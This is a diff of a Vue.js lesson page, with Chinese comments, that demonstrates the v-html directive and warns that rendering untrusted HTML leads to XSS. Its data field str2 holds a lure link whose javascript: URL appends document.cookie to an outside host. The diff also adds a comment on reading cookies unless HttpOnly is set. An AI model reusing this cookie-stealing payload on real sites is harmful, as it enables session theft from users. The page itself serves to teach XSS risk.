@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
-	<head>
-		<meta charset="UTF-8" />
-		<title>v-html指令</title>
-		<!-- 引入Vue -->
-		<script type="text/javascript" src="../js/vue.js"></script>
-	</head>
-	<body>
-		<!-- 
+  <head>
+    <meta charset="UTF-8" />
+    <title>v-html指令</title>
+    <!-- 引入Vue -->
+    <script type="text/javascript" src="../js/vue.js"></script>
+  </head>
+  <body>
+    <!-- 
 				v-html指令：
 						1.作用：向指定节点中渲染包含html结构的内容。
 						2.与插值语法的区别：
@@ -17,24 +17,25 @@
 									(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
 									(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
 		-->
-		<!-- 准备好一个容器-->
-		<div id="root">
-			<div>你好，{{name}}</div>
-			<div v-html="str"></div>
-			<div v-html="str2"></div>
-		</div>
-	</body>
+    <!-- 准备好一个容器-->
+    <div id="root">
+      <div>你好，{{name}}</div>
+      <div v-html="str"></div>
+      <div v-html="str2"></div>
+    </div>
+  </body>
 
-	<script type="text/javascript">
-		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+  <script type="text/javascript">
+    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
 
-		new Vue({
-			el:'#root',
-			data:{
-				name:'尚硅谷',
-				str:'<h3>你好啊！</h3>',
-				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
-			}
-		})
-	</script>
+    new Vue({
+      el: '#root',
+      data: {
+        name: '尚硅谷',
+        str: '<h3>你好啊！</h3>',
+        // 可用 document.cookie 获取当前网站的 cookie，但如果标记了 HttpOnly 则无法读取
+        str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
+      },
+    })
+  </script>
 </html>
